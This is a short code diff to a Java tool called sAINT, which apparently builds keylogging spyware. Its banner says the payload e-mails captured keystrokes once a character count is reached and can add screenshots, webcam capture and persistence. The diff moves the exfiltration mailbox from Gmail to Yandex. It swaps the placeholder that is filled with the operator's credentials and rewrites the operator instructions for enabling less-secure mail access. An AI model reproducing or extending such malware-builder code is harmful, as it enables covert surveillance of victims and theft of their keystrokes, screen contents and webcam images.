@@ -225,7 +225,7 @@ public class sAINT {
         clearScreen();
         System.out.println(""
                 + RED + "          +---------------------------------------------------+\n"
-                + RED + "    (__)  | " + YELLOW + "WARNING: Use Gmail account only!                  " + RED + "|\n"
+                + RED + "    (__)  | " + YELLOW + "WARNING: Use Yandex account only!                  " + RED + "|\n"
                 + RED + " (|)(00)  | " + WHITE + "E-mail will be sent when it reaches the specified " + RED + "|\n"
                 + RED + "  |/(__)\\ | " + WHITE + "number of characters. Optionally you can enable   " + RED + "|\n"
                 + RED + "  |_/ _|  | " + WHITE + "Screenshot, Webcam Capture and Persistence.       " + RED + "|\n"
@@ -361,7 +361,7 @@ public class sAINT {
             }
 
             // Replace data
-            replaceWord("email@gmail.com", email, path_source);
+            replaceWord("email@yandex.ru", email, path_source);
             replaceWord("passwordemail", password, path_source);
             if (screenshot) {
                 replaceWord("booleanScreenshot", "true", path_source);
@@ -405,8 +405,8 @@ public class sAINT {
                 }
             }
 
-            System.out.print(BLUE + "\n NOTE: Allow access to less secure apps on your gmail account. \n" + WHITE);
-            System.out.print(WHITE + " -> https://www.google.com/settings/security/lesssecureapps \n" + WHITE);
+            System.out.print(BLUE + "\n NOTE: Allow access to less secure apps on your yandex account. \n" + WHITE);
+            System.out.print(WHITE + " -> https://yandex.ru/support/yandex-360/customers/mail/ru/mail-clients/others \n" + WHITE);
             try {
                 waitTime(2);
             } catch (InterruptedException ex) {
